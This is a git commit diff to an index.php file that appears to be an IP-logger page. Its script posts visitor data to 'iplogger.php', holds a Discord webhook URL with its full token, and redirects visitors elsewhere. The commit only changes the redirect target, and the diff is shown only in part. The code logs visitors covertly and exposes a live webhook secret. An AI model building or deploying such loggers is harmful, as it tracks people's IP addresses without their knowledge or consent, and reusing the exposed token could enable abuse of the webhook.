343c260e6353a797497cd9b94a5e57db2ace1136
Gray Programmerz <54432616+graysuit@users.noreply.github.com>
2022-02-15 22:22:51 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,6 @@
 <script>
 var webhook = "https://discord.com/api/webhooks/930788015545131028/QbesUFN6pSADPmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPa2QMGYgYiBoOVJqUryG_w0o";
-var redirect = "https://discord.com/invite/WK4Fraka6b";
+var redirect = "https://graysuit.github.io";
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'iplogger.php', true);
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
